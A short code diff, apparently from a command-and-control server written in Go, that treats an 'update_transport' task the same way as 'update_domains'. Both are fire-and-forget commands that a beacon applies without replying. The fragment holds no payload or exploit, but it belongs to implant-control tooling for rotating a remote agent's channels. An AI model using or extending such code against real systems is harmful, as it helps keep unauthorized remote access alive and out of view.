@@ -2164,7 +2164,11 @@ func (c2 *C2Manager) deliverNextTask(beacon *Beacon, encrypted bool, peekOnly ..
 
 		// Fire-and-forget tasks: client executes these but never sends a result back.
 		// Dequeue immediately on first delivery so the task queue isn't blocked.
-		fireAndForget := strings.HasPrefix(task.Command, "update_domains:")
+		// update_transport rides the same channel as update_domains: the client
+		// applies it and stays silent, because a reply would travel on whichever
+		// transport the update just replaced.
+		fireAndForget := strings.HasPrefix(task.Command, "update_domains:") ||
+			strings.HasPrefix(task.Command, "update_transport:")
 
 		if task.Status != "sent" {
 			task.Status = "sent"
